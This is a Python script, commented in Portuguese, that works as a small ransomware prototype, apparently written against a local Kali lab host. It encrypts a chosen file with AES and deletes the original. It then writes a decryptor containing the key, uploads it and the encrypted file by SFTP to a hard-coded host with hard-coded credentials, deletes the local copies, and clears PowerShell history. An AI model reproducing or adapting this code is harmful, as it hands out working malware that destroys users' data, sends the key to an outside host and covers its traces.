import os
import socket
from socket import gethostbyname, gaierror
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import paramiko
import time

arquivo = input('Escreva o nome do arquivo a ser criptografado, ex. document.pdf: ')

backend = default_backend()
key = os.urandom(32)  # 256 bit
iv = os.urandom(16)  # 128 bit

# criptografia
cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
encryptor = cipher.encryptor()

# leitura do arquivo
try:
    file = open(f'{arquivo}', 'rb')
    pass
    data = file.read()
    file.close()
except FileNotFoundError:
    print('Arquivo nao encontrado.')
    exit()

# adicionando o padding
padder = padding.PKCS7(128).padder()
padded_data = padder.update(data) + padder.finalize()

# criptografa os dados
cipher_data = encryptor.update(padded_data) + encryptor.finalize()

# escreve os dados criptografados no arquivo
file = open('arquivo', 'wb')
file.write(cipher_data)
file.close()

# deleta o arquivo antigo
os.remove(f'{arquivo}')

# exibe mensagem de alerta
print('Seu arquivo foi criptografado.')

# cria o arquivo de descriptografia
decryptor_file = open('decryptor.py', 'w')

# escreve o código para descriptografia no arquivo
decryptor_file.write("import os\n")
decryptor_file.write("from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\n")
decryptor_file.write("from cryptography.hazmat.backends import default_backend\n")
decryptor_file.write("from cryptography.hazmat.primitives import padding\n\n")

decryptor_file.write("backend = default_backend()\n")
decryptor_file.write("key = \"" + key.hex() + "\"\n")
decryptor_file.write("iv = \"" + iv.hex() + "\"\n\n")

decryptor_file.write("# descriptografia\n")
decryptor_file.write("cipher = Cipher(algorithms.AES(bytes.fromhex(key)), modes.CBC(bytes.fromhex(iv)), backend=backend)\n")
decryptor_file.write("decryptor = cipher.decryptor()\n\n")

decryptor_file.write("# leitura do arquivo\n")
decryptor_file.write("file = open('arquivo', 'rb')\n")
decryptor_file.write("data = file.read()\n")
decryptor_file.write("file.close()\n\n")

decryptor_file.write("# descriptografa os dados\n")
decryptor_file.write("decrypted_data = decryptor.update(data) + decryptor.finalize()\n\n")

decryptor_file.write("# remove o padding\n")
decryptor_file.write("unpadder = padding.PKCS7(128).unpadder()\n")
decryptor_file.write("unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()\n\n")

decryptor_file.write("# escreve os dados descriptografados no arquivo\n")
decryptor_file.write(f"file = open('{arquivo}', 'wb')\n")
decryptor_file.write("file.write(unpadded_data)\n")
decryptor_file.write("file.close()\n\n")
decryptor_file.write("os.remove('arquivo')\n")
decryptor_file.write("print('Seu arquivo foi descriptografado')\n")

decryptor_file.close()

# exibe mensagem de conexao com o host
print('Tentando conexao com o host!')

host = '192.168.15.18'
user = 'kali'
passwd = 'kali'

path = '/home/kali/' # Trocar a pasta receptora aqui

# Enviando Arquivo De Descrypt
#Criando um objeto SSHClient
try:
    ssh = paramiko.SSHClient() 

    #Adicionando as credenciais 
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    socket.gethostbyname(host)    
    ssh.connect(hostname=host, username=user, password=passwd)
    pass

except:
    print("Host inativo, a criptografia não pode continuar. Verifique se o host de hospedagem da chave está ativo e tente novamente.\nNo entanto, seu arquivo foi criptografado e esta na mesma pasta do arquivo de password junto com o descriptador. ")
    exit()

#Criando um canal de conexão 
sftp = ssh.open_sftp()

print('Enviando arquivo de passowrd e o decryptor.py')

#Enviando password e desencriptador para o host
sftp.put("decryptor.py", f"{path}/decryptor.py")
sftp.put("arquivo", f"{path}/arquivo")

#Fechando o canal de conexão 
sftp.close()

#Removendo os arquivos de senha do computador
os.remove('decryptor.py')
os.remove('arquivo')

print('Limpando hitorico da maquina')
os.system("powershell -Command \"Clear-History\"")
